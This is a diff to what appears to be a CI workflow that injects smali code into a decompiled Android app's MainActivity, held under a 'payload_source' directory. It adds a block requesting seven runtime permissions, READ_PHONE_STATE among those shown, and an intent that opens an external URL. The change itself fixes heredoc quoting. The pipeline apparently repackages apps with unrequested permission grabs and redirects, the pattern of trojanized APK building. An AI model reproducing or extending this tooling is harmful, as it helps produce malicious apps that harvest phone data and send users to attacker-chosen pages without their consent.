@@ -44,7 +44,8 @@ jobs:
           fi
 
           # 1. Create Permission Injection File
-          cat > permissions.smali <<PERM
+          # Using single quotes for the cat command to prevent variable expansion issues
+          cat > permissions.smali <<'PERM'
     const/4 v0, 0x7
     new-array v0, v0, [Ljava/lang/String;
     const/4 v1, 0x0
@@ -69,11 +70,12 @@ jobs:
     const-string v2, "android.permission.READ_PHONE_STATE"
     aput-object v2, v0, v1
     const/4 v1, 0x1
-    invoke-virtual {p0, v0, v1}, L$NEW_PATH/MainActivity;->requestPermissions([Ljava/lang/String;I)V
 PERM
+          # Add the dynamic line separately to avoid YAML/Shell expansion issues
+          echo "    invoke-virtual {p0, v0, v1}, L$NEW_PATH/MainActivity;->requestPermissions([Ljava/lang/String;I)V" >> permissions.smali
 
           # 2. Create Redirect Injection File
-          cat > redirect.smali <<REDIR
+          cat > redirect.smali <<'REDIR'
     new-instance v0, Landroid/content/Intent;
     const-string v1, "android.intent.action.VIEW"
     invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
@@ -81,10 +83,11 @@ PERM
     invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
     move-result-object v1
     invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;
-    invoke-virtual {p0, v0}, L$NEW_PATH/MainActivity;->startActivity(Landroid/content/Intent;)V
 REDIR
+          # Add the dynamic line separately
+          echo "    invoke-virtual {p0, v0}, L$NEW_PATH/MainActivity;->startActivity(Landroid/content/Intent;)V" >> redirect.smali
 
-          # Inject using sed 'r' command (read file) to ensure perfect Smali syntax
+          # Inject using sed 'r' command
           sed -i "\|invoke-virtual {p0, v0}, L$NEW_PATH/MainActivity;->setContentView(I)V|r permissions.smali" "payload_source/smali/$NEW_PATH/MainActivity.smali"
           sed -i "\|invoke-virtual {p0, v0, v1}, L$NEW_PATH/MainActivity;->requestPermissions|r redirect.smali" "payload_source/smali/$NEW_PATH/MainActivity.smali"
 
